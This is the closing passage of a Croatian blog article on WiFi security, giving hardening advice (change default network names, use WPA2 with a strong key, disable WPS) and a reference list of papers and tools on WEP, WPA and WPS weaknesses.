      <li>Ako je zadano ime mreže <strong>jedno od sljedećih</strong>, odmah ga je potrebno <strong>promijeniti</strong>:</li>
      <ul>
        <li><strong>default</strong> - najčešće korišteno ime</li>
        <li><strong>naziv ili model pristupne točke ili usmjernika</strong> (npr. ZyXEL, Linksys i sl.)</li>
        <li>nazivi kao <strong>moja mreza, mreza, wifi i sl.</strong></li>
      </ul>
      <li>Ime koje je unaprijed postavio operater može se koristiti samo ako sadržava nasumične znakove ili brojeve</li>
    </ul>
    </li>
    <li>Koristiti <strong>WPA2-PSK ili WPA2-Enterprise</strong> zaštitu WiFi mreže</li>
    <li>Za WPA2 ključ koristiti niz od <strong>najmanje 8 znakova, koji nisu predvidljivi ili česti</strong></li>
    <li>
      <strong>Nepreporučljivi</strong> nizovi za ključ:
      <ul>
        <li>samo ime, prezime ili slično</li>
        <li>JMBG ili OIB</li>
        <li>datumi (bez znakova, samo znamenke)</li>
        <li><strong>naziv pristupne točke - ovo nije nikakva zaštita</strong></li>
      </ul>
    </li>
    <li><strong>Isključiti WPS</strong> ako se ne koristiti (<strong>posebno</strong> ako niste sigurni je li pristupna točka ranjiva na WPS napade)</li>
    <li>Ne dijelite WPA2 ključ s nepouzdanim osobama</li>
  </ol>
  <p><strong>Pridržavanje ovih uputa ne povećava nužno sigurnost mreže, već smanjuje mogućnosti da napadač otkrije sigurnosti ključ mreže.</strong></p>
</div>

## Izvori

### WiFi

<ol>
    <li><a href="https://www.wi-fi.org/discover-wi-fi"><cite>Discover Wifi</cite>, WiFi Alliance</a>, pregledano 20.05.2020.</li>
    <li><a href="https://www.digitaltrends.com/computing/what-is-wi-fi/"><cite>What is Wifi?</cite>, Digital Trends</a>, pregledano 20.05.2020.</li>
    <li><a href="https://keshavdulal.github.io/bscit-network-security-notes/bscit-ns-u5-wireless-security.html"><cite>Wifi Security Notes</cite>, BSCIT</a>, pregledano 23.05.2020.</li>
    <li><a href="https://www.wi-fi.org/discover-wi-fi/wi-fi-certified-6"><cite>Discover Wifi 6</cite>, WiFi Alliance</a>, pregledano 23.05.2020.</li>
</ol>

### WEP

<ol>
  <li><a href="http://download.aircrack-ng.org/wiki-files/doc/A_Key_Recovery_Attack_on_the_wep.pdf"><cite>A Key Recovery Attack on the WEP</cite>, Aircrack-ng</a>, pregledano 30.05.2020.</li>
  <li><a href="http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf"><cite>Intercepting Mobile Communications: The Insecurity of 802.11</cite></a>, Nikita Borisov, Ian Goldberg, David Wagner, pregledano 30.05.2020.</li>
  <li><a href="http://www.scs.stanford.edu/~sorbo/bittau-wep-slides.pdf"><cite>The Final Nail in WEP’s Coffin</cite> (prezentacija)</a>, Andrea Bittau, Mark Handley, Joshua Lackey, pregledano 30.05.2020.</li>
  <li><a href="https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay"><cite>Aireplay-ng - Interactive packet replay</cite>, Aircrack-ng</a>, pregledano 30.05.2020.</li>
  <li><a href="https://mentor.ieee.org/802.11/dcn/00/11-00-0362-00-000e-unsafe-at-any-key-size-an-analysis-of-the-wep-encapsulation.doc"><cite>Unsafe at any key size; An analysis of the WEP encapsulation</cite>, Jesse R. Walker (Intel)</a>, pregledano 31.05.2020.</li>
</ol>

### WPA/WPA2

<ol>
  <li><a href="https://www.cert.hr/wp-content/uploads/2009/06/CCERT-PUBDOC-2009-06-267.pdf"><cite>WPA2 zaštita, CCERT-PUBDOC-2009-06-267</cite>, CARNet</a>, pregledano 30.05.2020.</li>
  <li><a href="https://www.renderlab.net/projects/WPA-tables/"><cite>WPA tables</cite>, Renderlab</a>, pregledano 30.05.2020.</li>
  <li><a href="http://dl.aircrack-ng.org/breakingwepandwpa.pdf"><cite>Practical attacks against WEP and WPA</cite>, Martin Beck, Erik Tews</a>, pregledano 30.05.2020.</li>
  <li><a href="https://github.com/joswr1ght/cowpatty"><cite>coWPAtty: WPA2-PSK Cracking</cite>, Joshua Wright</a>, pregledano 31.05.2020.</li>
  <li><a href="https://github.com/derv82/wifite2"><cite>wifite2</cite>, derv82</a>, pregledano 31.05.2020.</li>
</ol>

### WPS

<ol>
  <li><a href="https://www.wi-fi.org/download.php?file=/sites/default/files/private/Wi-Fi_Simple_Configuration_Technical_Specification_v2.0.5.pdf"><cite>Wi-Fi Simple Configuration, Technical Specification, v2.0.5</cite>, WiFi Alliance</a>, pregledano 30.05.2020.</li>
  <li><a href="https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf"><cite>Brute forcing Wi-Fi Protected Setup</cite>, Stefan Viehböck</a>, pregledano 30.05.2020.</li>
  <li><a href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)"><cite>WPS Pixie Dust Attack (Offline WPS Attack)</cite></a>, pregledano 09.06.2020.</li>
  <li><a href="https://github.com/t6x/reaver-wps-fork-t6x"><cite>Reaver</cite></a>, pregledano 09.06.2020.</li>
</ol>

<p class="alert alert-success text-center"><strong>Tijekom istraživanja za članak nije stradao niti jedan mrežni uređaj!
</strong>😉</p>

<p xmlns:dct="http://purl.org/dc/terms/" xmlns:cc="http://creativecommons.org/ns#" class="license-text"><a rel="cc:attributionURL" href="https://mario-kopjar.from.hr/racunalne-mreze/wifi-security/"><span rel="dct:title">Sigurnost bezicnih mreza</span></a> by <a rel="cc:attributionURL" href="https://mario-kopjar.from.hr"><span rel="cc:attributionName">Mario Kopjar</span></a> is licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0<img style="height:22px!important;margin-left: 3px;vertical-align:text-bottom;" src="https://search.creativecommons.org/static/img/cc_icon.svg" /><img  style="height:22px!important;margin-left: 3px;vertical-align:text-bottom;" src="https://search.creativecommons.org/static/img/cc-by_icon.svg" /><img  style="height:22px!important;margin-left: 3px;vertical-align:text-bottom;" src="https://search.creativecommons.org/static/img/cc-nc_icon.svg" /></a></p>